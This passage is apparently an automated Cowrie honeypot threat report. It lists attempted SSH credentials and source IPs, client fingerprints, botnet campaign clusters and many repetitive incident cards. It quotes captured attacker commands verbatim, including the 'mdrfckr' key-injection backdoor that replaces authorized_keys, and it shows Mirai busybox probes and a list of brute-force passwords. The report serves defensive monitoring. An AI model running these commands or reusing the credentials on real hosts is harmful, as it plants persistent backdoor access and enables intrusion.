| `upload` | `1234` | `14.103.117.88` | 2026-09-27T15:43:42 |
| `345gs5662d34` | `345gs5662d34` | `14.103.117.88` | 2026-09-27T15:43:48 |
| `ftpuser` | `1qazXSW@` | `117.2.49.125` | 2026-09-27T15:44:58 |
| `root` | `example` | `10.0.0.73` | 2026-09-27T15:52:26 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-27T15:52:29 |
| `mourad` | `mourad@123` | `36.93.249.106` | 2026-09-27T15:55:38 |
| `345gs5662d34` | `345gs5662d34` | `36.93.249.106` | 2026-09-27T15:55:42 |
| `mourad` | `3245gs5662d34` | `36.93.249.106` | 2026-09-27T15:55:44 |
| `gitblit` | `gitblit` | `14.103.118.121` | 2026-09-27T15:56:13 |
| `dockeruser` | `123` | `35.244.32.167` | 2026-09-27T15:56:16 |
| `345gs5662d34` | `345gs5662d34` | `35.244.32.167` | 2026-09-27T15:56:21 |
| `dockeruser` | `3245gs5662d34` | `35.244.32.167` | 2026-09-27T15:56:22 |
| `gitblit` | `3245gs5662d34` | `14.103.118.121` | 2026-09-27T15:56:27 |
| `root` | `iptv123` | `45.169.200.254` | 2026-09-27T15:56:41 |
| `345gs5662d34` | `345gs5662d34` | `45.169.200.254` | 2026-09-27T15:56:44 |
| `root` | `3245gs5662d34` | `45.169.200.254` | 2026-09-27T15:56:45 |
| `root` | `Abcd12345!` | `14.103.118.121` | 2026-09-27T15:58:00 |
| `root` | `admin@root` | `217.60.97.61` | 2026-09-27T16:01:55 |
| `345gs5662d34` | `345gs5662d34` | `217.60.97.61` | 2026-09-27T16:01:56 |
| `root` | `3245gs5662d34` | `217.60.97.61` | 2026-09-27T16:01:56 |
| `bill` | `bill` | `81.23.173.32` | 2026-09-27T16:03:20 |
| `newuser` | `Password123!` | `139.59.133.58` | 2026-09-27T16:03:22 |
| `345gs5662d34` | `345gs5662d34` | `81.23.173.32` | 2026-09-27T16:03:24 |
| `345gs5662d34` | `345gs5662d34` | `139.59.133.58` | 2026-09-27T16:03:25 |
| `bill` | `3245gs5662d34` | `81.23.173.32` | 2026-09-27T16:03:25 |
| `newuser` | `3245gs5662d34` | `139.59.133.58` | 2026-09-27T16:03:25 |
| `root` | `password` | `193.112.192.91` | 2026-09-27T16:22:22 |
| `root` | `admin` | `193.112.192.91` | 2026-09-27T16:22:28 |
| `root` | `oracle` | `193.112.192.91` | 2026-09-27T16:22:31 |
| `root` | `Oracle@2024` | `193.112.192.91` | 2026-09-27T16:22:35 |
| `root` | `Oracle123` | `193.112.192.91` | 2026-09-27T16:22:39 |
| `root` | `oci` | `193.112.192.91` | 2026-09-27T16:22:56 |
| `root` | `opc` | `193.112.192.91` | 2026-09-27T16:23:00 |
| `root` | `1q2w3e4r` | `193.112.192.91` | 2026-09-27T16:23:12 |
| `root` | `Changeme123` | `193.112.192.91` | 2026-09-27T16:23:17 |
| `root` | `Welcome1` | `193.112.192.91` | 2026-09-27T16:23:21 |
| `root` | `ubuntu` | `193.112.192.91` | 2026-09-27T16:23:25 |
| `root` | `Hackers` | `193.112.192.91` | 2026-09-27T16:23:28 |
| `root` | `Contabo123` | `193.112.192.91` | 2026-09-27T16:23:34 |
| `root` | `toor` | `193.112.192.91` | 2026-09-27T16:23:39 |
| `opc` | `password` | `193.112.192.91` | 2026-09-27T16:23:46 |
| `admin` | `oracle` | `193.112.192.91` | 2026-09-27T16:24:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **493** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 301 |
| libssh | 77 |
| Paramiko (Python) | 25 |
| OpenSSH | 9 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 291 | 1 |
| `f555226df196...` | Mirai/variant | 73 | 27 |
| `a2de0f306611...` | Mirai/variant | 25 | 1 |
| `390ffe68a68c...` | Modern SSH client | 5 | 2 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 291 | 1 | Generic scanner |
| `f555226df196...` | libssh | 73 | 27 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 25 | 1 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 5 | 2 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 4 | 3 | — |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `1b8acd46a07d...` | Unknown | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 23 | 23 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "1qazXSW@\nazANC7qE7KJQ\nazANC7qE7KJQ"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `117.2.49.125`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
cat /proc/mounts; /bin/busybox DSLPJ
```
Source IPs: `37.252.69.10`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `108.59.244.5`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **88** |
| Unique ASNs | **45** |
| High-Risk ASNs | **36** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 30 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS14987` | Rethem Hosting LLC | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (391)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-61adc0667819

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:04` | `cowrie.login.success` |
| `2026-09-27 12:55:05` | `cowrie.session.params` |
| `2026-09-27 12:55:05` | `cowrie.command.input` |
| `2026-09-27 12:55:05` | `cowrie.log.closed` |
| `2026-09-27 12:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ba30fe1ea1

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:08` | `cowrie.session.connect` |
| `2026-09-27 12:55:08` | `cowrie.client.version` |
| `2026-09-27 12:55:08` | `cowrie.client.kex` |
| `2026-09-27 12:55:09` | `cowrie.login.success` |
| `2026-09-27 12:55:10` | `cowrie.session.params` |
| `2026-09-27 12:55:10` | `cowrie.command.input` |
| `2026-09-27 12:55:10` | `cowrie.log.closed` |
| `2026-09-27 12:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f284992d2bed

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:13` | `cowrie.session.connect` |
| `2026-09-27 12:55:13` | `cowrie.client.version` |
| `2026-09-27 12:55:13` | `cowrie.client.kex` |
| `2026-09-27 12:55:14` | `cowrie.login.success` |
| `2026-09-27 12:55:14` | `cowrie.session.params` |
| `2026-09-27 12:55:14` | `cowrie.command.input` |
| `2026-09-27 12:55:15` | `cowrie.log.closed` |
| `2026-09-27 12:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3582e826cdec

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:17` | `cowrie.session.connect` |
| `2026-09-27 12:55:17` | `cowrie.client.version` |
| `2026-09-27 12:55:18` | `cowrie.client.kex` |
| `2026-09-27 12:55:18` | `cowrie.login.success` |
| `2026-09-27 12:55:19` | `cowrie.session.params` |
| `2026-09-27 12:55:19` | `cowrie.command.input` |
| `2026-09-27 12:55:19` | `cowrie.log.closed` |
| `2026-09-27 12:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f6595f3e28

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:22` | `cowrie.session.connect` |
| `2026-09-27 12:55:22` | `cowrie.client.version` |
| `2026-09-27 12:55:22` | `cowrie.client.kex` |
| `2026-09-27 12:55:23` | `cowrie.login.success` |
| `2026-09-27 12:55:24` | `cowrie.session.params` |
| `2026-09-27 12:55:24` | `cowrie.command.input` |
| `2026-09-27 12:55:24` | `cowrie.log.closed` |
| `2026-09-27 12:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97f215949af0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:27` | `cowrie.session.connect` |
| `2026-09-27 12:55:27` | `cowrie.client.version` |
| `2026-09-27 12:55:27` | `cowrie.client.kex` |
| `2026-09-27 12:55:28` | `cowrie.login.success` |
| `2026-09-27 12:55:28` | `cowrie.session.params` |
| `2026-09-27 12:55:28` | `cowrie.command.input` |
| `2026-09-27 12:55:28` | `cowrie.log.closed` |
| `2026-09-27 12:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c4d524fd67

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:32` | `cowrie.session.connect` |
| `2026-09-27 12:55:32` | `cowrie.client.version` |
| `2026-09-27 12:55:32` | `cowrie.client.kex` |
| `2026-09-27 12:55:32` | `cowrie.login.success` |
| `2026-09-27 12:55:33` | `cowrie.session.params` |
| `2026-09-27 12:55:33` | `cowrie.command.input` |
| `2026-09-27 12:55:33` | `cowrie.log.closed` |
| `2026-09-27 12:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-414f5cfe1a26

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:37` | `cowrie.session.connect` |
| `2026-09-27 12:55:37` | `cowrie.client.version` |
| `2026-09-27 12:55:37` | `cowrie.client.kex` |
| `2026-09-27 12:55:38` | `cowrie.login.success` |
| `2026-09-27 12:55:39` | `cowrie.session.params` |
| `2026-09-27 12:55:39` | `cowrie.command.input` |
| `2026-09-27 12:55:39` | `cowrie.log.closed` |
| `2026-09-27 12:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-980761f19ad1

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:42` | `cowrie.session.connect` |
| `2026-09-27 12:55:42` | `cowrie.client.version` |
| `2026-09-27 12:55:42` | `cowrie.client.kex` |
| `2026-09-27 12:55:43` | `cowrie.login.success` |
| `2026-09-27 12:55:44` | `cowrie.session.params` |
| `2026-09-27 12:55:44` | `cowrie.command.input` |
| `2026-09-27 12:55:44` | `cowrie.log.closed` |
| `2026-09-27 12:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b0941a1c404

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:47` | `cowrie.session.connect` |
| `2026-09-27 12:55:47` | `cowrie.client.version` |
| `2026-09-27 12:55:47` | `cowrie.client.kex` |
| `2026-09-27 12:55:47` | `cowrie.login.success` |
| `2026-09-27 12:55:48` | `cowrie.session.params` |
| `2026-09-27 12:55:48` | `cowrie.command.input` |
| `2026-09-27 12:55:48` | `cowrie.log.closed` |
| `2026-09-27 12:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a152abc84f2

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:51` | `cowrie.session.connect` |
| `2026-09-27 12:55:51` | `cowrie.client.version` |
| `2026-09-27 12:55:52` | `cowrie.client.kex` |
| `2026-09-27 12:55:52` | `cowrie.login.success` |
| `2026-09-27 12:55:53` | `cowrie.session.params` |
| `2026-09-27 12:55:53` | `cowrie.command.input` |
| `2026-09-27 12:55:53` | `cowrie.log.closed` |
| `2026-09-27 12:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da6f9f252add

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:55 |
| **Last Seen** | 2026-09-27 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:55:57` | `cowrie.session.connect` |
| `2026-09-27 12:55:57` | `cowrie.client.version` |
| `2026-09-27 12:55:57` | `cowrie.client.kex` |
| `2026-09-27 12:55:57` | `cowrie.login.success` |
| `2026-09-27 12:55:58` | `cowrie.session.params` |
| `2026-09-27 12:55:58` | `cowrie.command.input` |
| `2026-09-27 12:55:58` | `cowrie.log.closed` |
| `2026-09-27 12:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf95d91a428

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:01` | `cowrie.session.connect` |
| `2026-09-27 12:56:01` | `cowrie.client.version` |
| `2026-09-27 12:56:01` | `cowrie.client.kex` |
| `2026-09-27 12:56:02` | `cowrie.login.success` |
| `2026-09-27 12:56:02` | `cowrie.session.params` |
| `2026-09-27 12:56:02` | `cowrie.command.input` |
| `2026-09-27 12:56:03` | `cowrie.log.closed` |
| `2026-09-27 12:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c15a0db00cc8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:06` | `cowrie.session.connect` |
| `2026-09-27 12:56:06` | `cowrie.client.version` |
| `2026-09-27 12:56:06` | `cowrie.client.kex` |
| `2026-09-27 12:56:07` | `cowrie.login.success` |
| `2026-09-27 12:56:07` | `cowrie.session.params` |
| `2026-09-27 12:56:07` | `cowrie.command.input` |
| `2026-09-27 12:56:08` | `cowrie.log.closed` |
| `2026-09-27 12:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d5dde51f83

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:11` | `cowrie.session.connect` |
| `2026-09-27 12:56:11` | `cowrie.client.version` |
| `2026-09-27 12:56:11` | `cowrie.client.kex` |
| `2026-09-27 12:56:11` | `cowrie.login.success` |
| `2026-09-27 12:56:12` | `cowrie.session.params` |
| `2026-09-27 12:56:12` | `cowrie.command.input` |
| `2026-09-27 12:56:12` | `cowrie.log.closed` |
| `2026-09-27 12:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1538ce232f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:16` | `cowrie.session.connect` |
| `2026-09-27 12:56:16` | `cowrie.client.version` |
| `2026-09-27 12:56:16` | `cowrie.client.kex` |
| `2026-09-27 12:56:17` | `cowrie.login.success` |
| `2026-09-27 12:56:18` | `cowrie.session.params` |
| `2026-09-27 12:56:18` | `cowrie.command.input` |
| `2026-09-27 12:56:18` | `cowrie.log.closed` |
| `2026-09-27 12:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9a508e445c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:21` | `cowrie.session.connect` |
| `2026-09-27 12:56:21` | `cowrie.client.version` |
| `2026-09-27 12:56:21` | `cowrie.client.kex` |
| `2026-09-27 12:56:21` | `cowrie.login.success` |
| `2026-09-27 12:56:22` | `cowrie.session.params` |
| `2026-09-27 12:56:22` | `cowrie.command.input` |
| `2026-09-27 12:56:22` | `cowrie.log.closed` |
| `2026-09-27 12:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3174884d696b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:26` | `cowrie.session.connect` |
| `2026-09-27 12:56:26` | `cowrie.client.version` |
| `2026-09-27 12:56:26` | `cowrie.client.kex` |
| `2026-09-27 12:56:26` | `cowrie.login.success` |
| `2026-09-27 12:56:27` | `cowrie.session.params` |
| `2026-09-27 12:56:27` | `cowrie.command.input` |
| `2026-09-27 12:56:27` | `cowrie.log.closed` |
| `2026-09-27 12:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-889a787a0e1a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:56 |
| **Last Seen** | 2026-09-27 12:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:56:31` | `cowrie.session.connect` |
| `2026-09-27 12:56:31` | `cowrie.client.version` |
| `2026-09-27 12:56:31` | `cowrie.client.kex` |
| `2026-09-27 12:56:32` | `cowrie.login.success` |
| `2026-09-27 12:56:33` | `cowrie.session.params` |
